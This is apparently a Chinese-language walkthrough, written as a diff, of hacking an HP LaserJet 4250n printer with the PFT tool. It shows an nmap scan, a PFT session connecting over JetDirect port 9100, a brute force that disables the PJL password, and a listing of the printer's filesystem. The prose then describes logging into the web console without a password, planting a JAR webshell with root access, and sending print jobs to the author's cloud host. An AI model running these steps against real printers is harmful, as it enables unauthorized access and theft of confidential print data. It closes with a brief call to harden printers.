@@ -1,0 +1,140 @@
+1  攻击测试前的准备
+
+以下的demo作者将使用 PHENOELIT 开发的PFT工具.
+
+这个工具点击此处可以下载.
+
+作者使用的操作系统是 Ubuntu 12.0.4 LTS,下载PFT工具之后将之解压，然后用以下的命令将PFT工具编译：
+
+Default
+~/development/pentest/pjllib$ make
+~/development/pentest/pjllib$ cd pft
+~/development/pentest/pjllib/pft$ make
+在类Unix机器上能完美编译，但是在windows机器上的编译方法跟Unix上有所不同，具体如下：
+
+#include <iostream>
+using namespace std;
+#include <stdio.h>                      // cant live without printf() ;)
+#ifndef UNIX
+// 如果是windows系统，需要换成以下头文件：
+
+Default
+
+#include <direct.h>                     // _getcwd() ...
+#include <io.h>                         // _open()
+#include <fcntl.h>                      //  -"-
+#include <sys/types.h>                  //  -"-
+#include <sys/stat.h>                   //  -"-
+#include <conio.h>                      // if key pressed _kbhit()
+#else
+//如果是类Unix系统，需要换成以下头文件：
+
+Default
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <signal.h>
+#include <sys/types.h>                  // open(), close(), write()
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <string.h>
+#endif //UNIX
+修复之后，虽然编译的过程中有Warnings提醒，但是还是能够执行的。
+0x02  攻击过程
+
+现在我在命令行下运行，出现了以下的提示信息：
+
+Default
+
+PFT - PJL file transfer
+FX of Phenoelit <fx@phenoelit.de>
+Version 0.7 ($Revision: 1.8 $)
+我们使用help命令来查看PFT工具所有的使用命令：
+
+pft> help
+help <command>
+quit
+server [hostname]
+port [port number]
+connect
+close
+env {read|print|show|set|options|changed|commit|unprotect|bruteforce}
+message "Display Msg"
+failure "Failure Msg"
+volumes
+chvol [vol:]
+pwd
+ls
+cd [directory]
+mkdir [directory]
+rm [file]
+get [file]
+put [local file]
+append [local file] [file]
+lpwd
+lcd [directory]
+session
+timeout [timeout]
+pause
+好了，工具启动成功，现在我们将HP LaserJet 4250n打印机作为攻击目标，先对目标使用NMAP进行SYN扫描。你能看到HP LaserJet 4250n打印机上开放了哪些端口。我们需要注意的是9100端口，它是JetDirect监听的端口。进过NMAP扫描之后，我们可以看到9100端口是打开的：
+~/development/pentest/pjllib/pft$ sudo nmap -sS 192.168.15.200
+ 
+ Starting Nmap 5.21 ( http://nmap.org ) at 2013-07-03 07:30 EDT
+ Nmap scan report for 192.168.15.xxx
+ Host is up (0.0018s latency).
+ Not shown: 990 closed ports
+ PORT      STATE SERVICE
+ 21/tcp    open  ftp
+ 23/tcp    open  telnet
+ 80/tcp    open  http
+ 280/tcp   open  http-mgmt
+ 443/tcp   open  https
+ 515/tcp   open  printer
+ 631/tcp   open  ipp
+ 7627/tcp  open  unknown
+ 9100/tcp  open  jetdirect
+ 14000/tcp open  unknown
+ MAC Address: 00:1A:4B:16:91:2F (Hewlett Packard)
+  
+  Nmap done: 1 IP address (1 host up) scanned in 1.56 seconds
+  Now to fire up pft and throw the goodies at it
+  接下来我们使用PFT工具连接到HP LaserJet 4250n打印机上：
+
+ pft> server 192.168.15.200
+  Server set to 192.168.15.200
+  pft> port 9100
+  Port set to 9100
+  pft> connect
+  Connected to 192.168.15.200:9100
+  Device: hp LaserJet 4250
+  好的，我们首先来修改一下打印机屏幕的显示信息：
+
+ pft> help message
+  Sets a display (ready) message on the device. Have fun.
+  pft> message "Altamira Rocks!!"
+  Display message set to 'Altamira Rocks!!'
+  结果如何？：
+  Hacking HP Printers for Fun3
+
+  HP LaserJet 4250n打印机上PJL程序保护，PFT工具可以轻易将之破解：
+
+ pft> env bruteforce
+  try 30
+  INFO: force_recv_clear() timed out for 270bytes (10 sec)
+  Password disabled successfully
+  好吧，很渣的密码….
+  现在，如果某些高级一点的打印机上有自带硬盘的话，我们可以利用以下命令查看：
+ pft> volumes
+  Volume       Size       Free        Location      Label     Status
+  0:   12619776   11786240             RAM          ? READ-WRITE
+  现在 O 盘上有什么东西呢?我们来看看：
+ pft> ls
+  0:\
+  .                             -          d
+  ..                            -          d
+  PostScript                    -          d
+  PJL                           -          d
+  saveDevice                    -          d
+  webServer                     -          d
+          经过对HP LaserJet 4250n打印机上文件系统一番查看之后，我们看到了几个有趣的文件夹。还发现了有 java package uploader页面, 网站控制台居然基于 java！,点击这个页面之后，弹出 “Need to set password”提示访问者重设管理员密码。设置好管理员密码之后.我被提示要输入管理员账号与密码, 但是由于我们使用了PFT工具暴力破解了PJL程序保护，居然不用密码就能够登陆….Hacking HP Printers for Fun4这个时候就可以上次一些Jar马，不用提取系统的最高权限了，返回的Webshell就是root权限了！这个时候我就能将所有的打印任务上传到我的云端主机了。
+          0x03  总结网络打印机对一些公司或组织而言，是非常具有价值的的资源。对黑客而言也是如此。所以需要将你的打印机进行安全加固了！Thanks for reading!!
